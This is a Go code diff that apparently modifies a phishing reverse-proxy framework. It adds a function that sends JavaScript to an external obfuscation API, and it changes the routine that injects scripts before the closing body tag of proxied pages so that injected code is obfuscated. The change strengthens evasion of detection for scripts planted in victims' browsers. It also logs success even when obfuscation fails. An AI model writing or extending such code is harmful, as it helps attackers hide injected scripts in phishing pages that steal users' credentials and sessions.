@@ -1274,6 +1274,36 @@ func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Re
 	return req, nil
 }
 
+func obfuscateJavaScript(script string) (string, error) {
+	type ObfuscatorResponse struct {
+		ObfuscatedCode string `json:"obfuscatedCode"`
+	}
+	apiURL := "https://obfuscator.io/api/obfuscate"
+	requestBody, err := json.Marshal(map[string]string{
+		"source": script,
+	})
+	if err != nil {
+		return "", err
+	}
+	resp, err := http.Post(apiURL, "application/json", bytes.NewBuffer(requestBody))
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	var obfuscatorResponse ObfuscatorResponse
+	err = json.Unmarshal(body, &obfuscatorResponse)
+	if err != nil {
+		return "", err
+	}
+	return obfuscatorResponse.ObfuscatedCode, nil
+}
+
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
 	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
@@ -1283,23 +1313,23 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 	}
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
-	
 	if script != "" {
-		minifier := minify.New() // "github.com/tdewolff/minify/js"
-		minifier.AddFunc("text/javascript", js.Minify)
-		obfuscatedScript, err := minifier.String("text/javascript", script)
+		obfuscatedScript, err := obfuscateJavaScript(script)
 		if err != nil {
-			// Handle error - Obfuscation failed
-			d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
+			log.Debug("Javascript obfuscation: Failed - (Using original javascript)")
+			obfuscatedScript = script // Fallback to original script
 		}
-		d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + obfuscatedScript + "</script>\n${1}"
-		//d_inject = "<script" + js_nonce + ">" + "function doNothing() {var x =0};" + script + "</script>\n${1}"
-
+		log.Debug("Javascript obfuscation: Success")
+		d_inject = "<script" + js_nonce + ">" + obfuscatedScript + "</script>\n${1}"
 	} else if src_url != "" {
 		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
-} 
+	}
+	log.Debug("Javascript Injected...")
+	ret := []byte(re.ReplaceAllString(string(body), d_inject))
+	return ret
+}
 
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
 	vals := u.Query()
